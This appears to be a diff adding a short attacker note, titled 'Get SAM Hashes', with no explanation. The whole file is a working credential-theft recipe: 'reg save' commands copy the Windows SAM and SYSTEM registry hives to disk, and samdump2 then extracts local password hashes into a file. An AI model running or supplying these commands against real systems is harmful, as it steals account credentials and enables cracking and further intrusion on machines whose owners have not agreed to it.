@@ -1,0 +1,5 @@
+# Get SAM Hashes
+reg save HKLM\SAM c:\SAM
+reg save HKLM\System c:\System
+
+samdump2 System SAM > hashes
